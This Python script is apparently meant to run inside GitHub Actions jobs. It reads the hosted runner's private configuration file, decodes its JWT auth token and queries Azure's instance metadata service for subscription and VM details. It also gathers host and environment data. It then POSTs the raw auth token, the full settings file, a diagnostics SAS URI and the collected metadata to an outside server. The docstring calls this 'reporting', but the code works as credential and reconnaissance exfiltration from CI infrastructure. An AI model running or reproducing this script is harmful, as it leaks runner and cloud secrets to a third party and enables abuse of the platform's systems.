#!/usr/bin/env python3
"""
Report /opt/hca/.settings URLs and metadata to httpprint endpoint.
Each GitHub Actions job calls this script independently.
"""
import json, os, base64, socket, subprocess, urllib.request, urllib.error, datetime

HTTPPRINT_URL = "https://httpprint.femboy.us.ci"
SETTINGS_PATH = "/opt/hca/.settings"


def run(cmd, timeout=10):
    """Run shell command, return stripped stdout or empty string."""
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()
    except Exception:
        return ""


def decode_jwt_payload(token):
    """Decode JWT payload (second segment) without verification."""
    try:
        payload = token.split(".")[1]
        payload += "=" * ((4 - len(payload) % 4) % 4)
        return json.loads(base64.b64decode(payload))
    except Exception:
        return {}


def get_host_meta():
    """Collect host-level metadata."""
    now = datetime.datetime.now(datetime.timezone.utc)
    return {
        "hostname": run("hostname"),
        "fqdn": run("hostname -f"),
        "whoami": run("whoami"),
        "uptime": run("uptime -p 2>/dev/null || uptime"),
        "boot_time": run("who -b 2>/dev/null"),
        "os": run("cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2- | tr -d '\"'"),
        "kernel": run("uname -r"),
        "arch": run("uname -m"),
        "cpu_cores": run("nproc"),
        "memory": run("free -h | awk '/^Mem:/{print $2}'"),
        "disk": run("df -h / | awk 'NR==2{print $2\" total, \"$4\" free\"}'"),
        "public_ip": run("curl -s --max-time 5 ifconfig.me 2>/dev/null", timeout=8),
        "timestamp_utc": now.isoformat(),
    }


def get_azure_imds():
    """Query Azure Instance Metadata Service."""
    try:
        req = urllib.request.Request(
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            headers={"Metadata": "true"},
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read())
        compute = data.get("compute", {})
        net = data.get("network", {}).get("interface", [])
        private_ip = ""
        public_ip = ""
        for iface in net:
            for ip in iface.get("ipv4", {}).get("ipAddress", []):
                private_ip = ip.get("privateIpAddress", "")
                public_ip = ip.get("publicIpAddress", "") or public_ip
        return {
            "vm_id": compute.get("vmId"),
            "vm_name": compute.get("name"),
            "vm_size": compute.get("vmSize"),
            "location": compute.get("location"),
            "subscription_id": compute.get("subscriptionId"),
            "resource_group": compute.get("resourceGroupName"),
            "os_type": compute.get("osType"),
            "version": compute.get("version"),
            "private_ip": private_ip,
            "public_ip": public_ip,
        }
    except Exception:
        return {}


def get_github_meta():
    """Collect GitHub Actions environment variables."""
    keys = [
        "GITHUB_RUN_ID", "GITHUB_JOB", "GITHUB_WORKFLOW", "GITHUB_REPOSITORY",
        "GITHUB_SHA", "GITHUB_RUNNER_NAME", "GITHUB_ACTOR", "GITHUB_REF",
        "GITHUB_EVENT_NAME", "GITHUB_RUN_NUMBER", "GITHUB_SERVER_URL",
    ]
    return {k: os.environ.get(k, "") for k in keys}


def main():
    # 1. Read .settings
    try:
        with open(SETTINGS_PATH) as f:
            settings_raw = f.read()
        settings = json.loads(settings_raw)
    except Exception as e:
        print(f"ERROR: cannot read {SETTINGS_PATH}: {e}")
        return

    # 2. Decode JWT
    auth_token = settings.get("authToken", "")
    jwt_payload = decode_jwt_payload(auth_token) if auth_token else {}

    # 3. Check token expiry
    now_ts = datetime.datetime.now(datetime.timezone.utc).timestamp()
    rbf = jwt_payload.get("rbf", 0)
    ret = jwt_payload.get("ret", 0)
    token_expired = now_ts > rbf if rbf else None

    # 4. Collect all metadata
    meta = {
        "host": get_host_meta(),
        "azure_imds": get_azure_imds(),
        "github": get_github_meta(),
        "settings_meta": {
            "config_id": settings.get("configId"),
            "mode": settings.get("mode"),
            "quota_id": settings.get("quotaId"),
            "return_job_result_for_hosted": settings.get("returnJobResultForHosted"),
            "job_start_timeout": settings.get("jobStartTimeout"),
            "runner_command": settings.get("runnerCommand"),
        },
        "jwt_meta": {
            "vmn": jwt_payload.get("vmn"),
            "mac": jwt_payload.get("mac"),
            "cfg": jwt_payload.get("cfg"),
            "cpt": jwt_payload.get("cpt"),
            "reg": jwt_payload.get("reg"),
            "env": jwt_payload.get("env"),
            "imn": jwt_payload.get("imn"),
            "imv": jwt_payload.get("imv"),
            "wst": jwt_payload.get("wst"),
            "rlm": jwt_payload.get("rlm"),
            "skf": jwt_payload.get("skf"),
            "sub": jwt_payload.get("sub"),
            "iss": jwt_payload.get("iss"),
            "iat": jwt_payload.get("iat"),
            "rbf": jwt_payload.get("rbf"),
            "ret": jwt_payload.get("ret"),
            "token_expired": token_expired,
            "seconds_since_rbf": int(now_ts - rbf) if rbf else None,
        },
    }

    # 5. Assemble payload
    payload = {
        "meta": meta,
        "urls": {
            "schedulerApiUrl": settings.get("schedulerApiUrl", ""),
            "traceApiUrl": settings.get("traceApiUrl", ""),
            "watchdogTraceApiUrl": settings.get("watchdogTraceApiUrl", ""),
            "diagnosticsSasUri": settings.get("diagnosticsSasUri", ""),
        },
        "authToken": auth_token,
        "settings_raw": settings_raw,
    }

    # 6. POST to httpprint
    job_name = os.environ.get("GITHUB_JOB", "unknown")
    post_url = f"{HTTPPRINT_URL}/{job_name}"
    body = json.dumps(payload, indent=2).encode("utf-8")

    print(f"Reporting to {post_url}")
    print(f"Payload size: {len(body)} bytes")

    try:
        req = urllib.request.Request(
            post_url,
            data=body,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=30) as resp:
            print(f"Response: {resp.status} {resp.read().decode()}")
    except Exception as e:
        print(f"ERROR reporting: {e}")


if __name__ == "__main__":
    main()
